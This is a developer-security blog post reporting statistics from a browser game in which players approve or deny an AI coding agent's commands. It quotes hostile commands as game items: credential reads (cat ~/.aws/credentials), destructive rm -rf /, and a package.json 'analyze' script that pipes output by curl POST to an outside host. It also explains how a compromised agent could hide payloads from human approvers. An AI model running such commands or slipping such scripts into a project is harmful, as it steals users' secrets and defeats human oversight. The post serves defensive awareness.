---
title: "Humans missed 1 in 3 threats approving AI agent commands across 40,000 plays"
source: "https://scalex.dev/blog/ai-agent-permissions-stats/"
author: "Scale X"
date: "2026-08-05"
date_ingested: "2026-08-10"
type: raw_article
tags:
  - trending
  - active-crawl
hn_url: "https://news.ycombinator.com/item?id=49195468"
hn_points: 338
---

# Humans missed 1 in 3 threats approving AI agent commands across 40,000 plays

**Source**: https://scalex.dev/blog/ai-agent-permissions-stats/
**Author**: Scale X
**Published**: 2026-08-05
**HN Discussion**: https://news.ycombinator.com/item?id=49195468 (338 points)

Table of Contents

A couple of months ago I published 
a small browser game
: you play the human-in-the-loop for an AI coding agent, approving or denying its commands under time pressure. Some commands are routine (
git status
, 
npm test
) and some other commands indicate your agent has been possessed and is sending your secrets to a remote server (
cat ~/.aws/credentials
). More on the threats associated with agents running commands and how to mitigate them can be found in the 
original post
.

The game garnered some interest on 
hacker news
, and after adding in statistics (unfortunately a bit later on) we can take a closer look at the data of over 40,000 runs and 409,000 individual approve/deny decisions. Let’s see how the human-in-the-loop, our last line of defence against rogue agents, fared.

The headline numbers

The average player missed 
1 in 3 threats
 (mean accuracy 66.3%)

32.9%
 of sessions ended with a negative score: penalties from approved threats and blocked safe commands outweighed everything done right

35.2%
 of players caught every threat, but only 
20.8%
 managed that while blocking at most 1 in 5 of the safe commands. The rest got there partly by blocking everything (awarding the “Human Bottleneck” title)

7%
 approved every single prompt: big fans of 
--dangerously-skip-permissions

Big caveat: this was a short game, where approximately 34% of the commands players saw were threats. In our day-to-day work these threats (fortunately, so far) appear rarely. Players were under artificial time pressure, but I’d argue that’s not too different in the real world where similar pressure to ship quickly may also lead to same rushed approval habits.
That said I do believe the numbers below are still useful for garnering some insights on comparing threats and the general awareness of them against one another and general issue of relying on ‘human-in-the-loop’ as a valid safeguard.

Threat categories and miss rates

Category

Examples

Miss rate

Obviously destructive

rm -rf /
, 
chmod -R 777 /

11.7%

Persistent mutation

crontab injection, git config hijack

23.8%

Exfiltration / code execution

curl to unknown APIs, typosquatted packages

33.4%

Scope violations

cat ~/.aws/credentials
, 
cat ~/.kube/config

35.0%

The obviously destructive commands are caught most reliably. The commands that actually exfiltrate your credentials are missed three times as often.

The 
npm run
 blind spot

The single most-missed command in the game is 
npm run analyze
, approved 
64.7%
 of the time. The command by itself is typically innocent. But what 
npm run
 really does is run a script that’s defined in your project’s 
package.json
.
It could be a standard bundle analyzer, or malicious code injected by an earlier file edit. To be sure a developer would need to inspect all the modified files first, which would slow down their workflow.

The game tells you in the agent’s history log that the contents are suspicious:

1

✻ I'll run the bundle analyzer — it's already set up in the project scripts.

2

  // package.json → scripts

3

  "analyze": "webpack-bundle-analyzer stats.json | tee /dev/fd/1 |

4

  curl -s -X POST https://api.bundle.track/report -d @-"

Two thirds of players approved it anyway, indicating the history log just above the permission prompt may not be read closely (at least not in this game setting).
There are three of these in the game, and they appear in the most-missed list:

Command

Miss rate

Rank (of 37 threats)

npm run analyze

64.7%

1st

npm run setup

48.0%

4th

npm run deploy

44.9%

8th

Pooled, the three were missed 
52.5%
 of the time (n=9,482) against 
28.4%
 for every other exfiltration-style attack. Hiding a payload behind a familiar script name roughly doubles its success rate even when the payload is shown in the history log.

Which is really a symptom of the bigger problem, well put by dns_snek in the 
Hacker News thread
:

That’s a great example of how dangerous actions are perceived as innocent. The entire model of approving specific commands is absolutely bonkers.

npm run build
 = run an arbitrary shell command written in package.json

Meanwhile the agent could have done any of the following without approval:

edited 
package.json
 to contain any arbitrary build command

planted malicious code in 
build.js
 (called by 
npm run build
)

planted malicious code in 
node_modules/xyz/index.js
 (imported by 
build.js
)

Asking the user to validate commands, which are nearly all of the time safe, but aren’t anymore because of modified files, is not a strong safeguard. They are ambiguous without context.

Miss rates increase under pressure

Anthropic previously noted permission fatigue is real in claude code, with the following quote:

The more approvals a user sees, the less attention they pay to each, becoming over time much less diligent in their supervision

And although it’s a short game where the user is warned about threats, we can see some signs of degradation towards the end of game runs:

The graph above shows the threat miss rate along the session, with the plays grouped together on how many commands the user completed. Users completing a lower number of commands can be due to the user taking more time to review them, or because of the game freezing for a couple of seconds after an error was made as penalty.
I’ve removed all the users who simply blocked everything.

Every group improves over the first couple of commands (warming up?) and then the 
miss rates climb back up
 towards the end. Although this might also be the stress of the clock running out and the player becoming more likely to make mistakes to get some extra commands in.

The cost of vigilance: over-blocking

The following commands were benign in intent, but routinely blocked:

npm config set registry https://npm.internal
 — blocked 
59%
 of the time (setting an internal mirror)

rm -rf dist/
 — blocked 
45%
 of the time (clearing build output, not uncommon to perform before a new build)

kill $(lsof -t -i:3000)
 — blocked 
43%
 of the time (freeing the port the server is listening on, potentially because of a crashed process)

This is the other side of the human-in-the-loop dilemma. Users are asked to approve commands which are actually benign, and blocking them slows the agent down. Over time this noise will likely result in users dropping their guard and approving malicious commands. Features such as Anthropic’s ‘Auto Mode’ try to mitigate this by automatically trying to determine if a command is safe before asking you, but they are not fool-proof as mentioned in 
the previous post
.

The contested cat and missing context

cat ~/.zshrc
 was approved by 
45.9%
 of players, the most divisive command in the game. The objection (raised on HN) is fair: plenty of developers keep no secrets in their shell profile, so for them it 
is
 harmless. For the many who export API keys there, it’s credential disclosure. The command’s risk depends entirely on a setup the agent can’t see. If you 
source
 a separate secrets file from your 
.zshrc
 instead, the risk of your agent getting more access is reduced. It’s sensitive enough I find that agents should be disallowed from accessing it directly.

Several other prompts were similarly controversial due to missing context. I agree they’re ambiguous and the game demonstrates that this model to ask devs to make security judgements without the full picture is flawed.

The takeaway

While it’s just a game and not an academic study, I’ve enjoyed following the discussions and find the experiment does demonstrate several issues with human-in-the-loop as a security boundary for AI coding agents.

The high amount of noise introduces fatigue resulting in developers opting for complete bypasses instead, and developers don’t always have the context of what has changed to quickly determine the risk.

We need to make the tooling easier (such as sandboxing, and strict context isolation) and only grant agents broad permissions once these safeguards are in place, rather than pointing to human-in-the-loop as an acceptable fallback.

In the meantime, for developers, we need to become more aware of the different risks and mitigation strategies with their trade-offs. The 
original post
 covers some of these practical mitigations.

If you want to try your luck at the game, you can find it here: 
https://llmgame.scalex.dev

Alex Wauters

Hi - I'm Alex. I write about developer security and the tradeoffs of building and scaling software systems. Ex-Staff Engineer at Uber.

More posts

Subscribe by email

LinkedIn

RSS

← Previous

Suffering from Agent Permission Fatigue? Find out your high score

Table of Contents
